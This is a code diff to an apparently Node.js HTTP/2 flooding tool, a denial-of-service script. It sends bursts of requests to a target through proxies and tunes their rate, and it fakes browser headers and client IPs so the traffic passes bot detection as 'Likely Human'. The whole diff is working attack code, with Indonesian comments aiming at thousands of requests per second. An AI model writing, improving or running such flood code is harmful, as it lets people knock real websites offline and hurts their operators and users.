@@ -327,15 +327,11 @@ const generateHeaders = (browser) => {
     // Cache IPs — avoids 4 redundant generateLegitIP() calls per block
     const lip1=generateLegitIP(), lip2=generateLegitIP(), lip3=generateLegitIP(), lip4=generateLegitIP();
 
-    const buildAuthority = () => Math.random()<0.65
-        ? parsedTarget.host
-        : (Math.random()<0.4?'www.':Math.random()<0.3?'cdn.':Math.random()<0.2?'img.':'static.') + parsedTarget.host;
+    const buildAuthority = () => parsedTarget.host;
 
-    const buildPath = () => parsedTarget.path
-        + '?' + generateRandomString(6)  + '=' + generateRandomString(12)
-        + '&' + generateRandomString(5)  + '=' + generateRandomString(10,18)
-        + '&' + generateRandomString(4)  + '=' + generateRandomString(8,16)
-        + '&cb=' + Date.now() + '&session=' + generateRandomString(10);
+    const buildPath = () => parsedTarget.path;
+
+
 
     // Modernized headers with REALISTIC ORDERING for "Likely Human" score
     const base = {
@@ -543,22 +539,6 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
         let count = 0;
         let running = true;
 
-        // Connection Pool untuk High RPS
-        const clients = [];
-        const createClient = () => {
-            const c = http2.connect(parsedTarget.href, {
-                protocol: "https",
-                createConnection: () => tlsSocket,
-                settings : h2settings,
-                socket: tlsSocket,
-            });
-            c.setMaxListeners(0);
-            return c;
-        };
-
-        // Pre-warm 3 clients per proxy connection
-        for(let i=0; i<3; i++) clients.push(createClient());
-
         const doBurst = async () => {
             if (!running) return;
             if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
@@ -566,45 +546,48 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 return;
             }
 
-            // Target 5k RPS logic: Lebih agresif
-            const burstSize = Math.max(5, Math.floor(args.Rate / 5)); 
+            // Target High RPS: Pakai outer 'client' langsung
+            const burstSize = Math.max(10, Math.floor(args.Rate / 2)); 
             
             for (let i = 0; i < burstSize; i++) {
                 if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) break;
                 
                 const freshBrowser = getRandomBrowser();
                 const dynHeaders = generateHeaders(freshBrowser);
-                const client = randomElement(clients);
 
                 try {
-                    setImmediate(() => {
-                        const req = client.request(dynHeaders, {
-                            weight: freshBrowser === 'chrome' ? 256 : 220,
-                            dependsOn: 0,
-                            exclusive: true
-                        });
-                        
-                        req.on('response', (res) => {
-                            req.close();
-                            req.destroy();
-                        });
-                        req.end();
+                    const req = client.request(dynHeaders, {
+                        weight: freshBrowser === 'chrome' ? 256 : 220,
+                        dependsOn: 0,
+                        exclusive: true
                     });
+                    
+                    req.on('response', () => {
+                        req.close();
+                        req.destroy();
+                    });
+                    
+                    req.on('error', () => {
+                        req.close();
+                        req.destroy();
+                    });
+
+                    req.end();
                     count++;
                 } catch (_) {}
 
                 if (count >= args.time * args.Rate) {
                     running = false;
-                    clients.forEach(c => c.close());
+                    client.close();
                     return;
                 }
             }
 
             if (running) {
-                // Delay minimalis untuk target 5k peak
-                setTimeout(doBurst, 1);
+                setImmediate(doBurst);
             }
         };
+
 
 
 
